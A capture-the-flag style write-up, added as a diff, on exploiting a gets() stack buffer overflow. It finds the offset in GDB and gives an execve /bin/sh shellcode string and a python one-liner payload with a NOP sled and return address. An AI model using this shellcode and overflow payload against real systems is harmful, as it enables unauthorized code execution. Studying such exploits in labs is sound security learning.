@@ -1,0 +1,21 @@
+In this problem we can first open GDB to examine the main function.
+Here we see that it's using gets which is susceptible to a buffer overflow exploit. 
+
+From this point we can grab a basic shellcode off of shellstorm to work with. 
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+http://shell-storm.org/shellcode/files/shellcode-811.php
+
+From here we need to know how large the buffer is. I found that with 71 character the program
+seg faults (This can be derived by the -0x43 value pushed which equals 67)
+Upon some examining in gdb, we could find that the address in memory is aproximetly
+0xffffd660. From here we can attach a nop sled and place our shellcode at the end of it
+
+Here is an outline for my version of the exploit
+$(python -c 'print "A" * 71 + "\xc0\xd6\xff\xff" + "\x90" * 300 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
+This worked with GDB in launching /bin/dash , so now I need to modify pointers to get it to hit the nopsled
+
+Upon playing arround with the addresses, I found that the address \x20\xd7\xff\xff was not segfaulting, but it
+wasn't executing the shell like it should have been. To fix this, we can append the python print to a cat call
+to stop the function from returning prematurly 
+
+
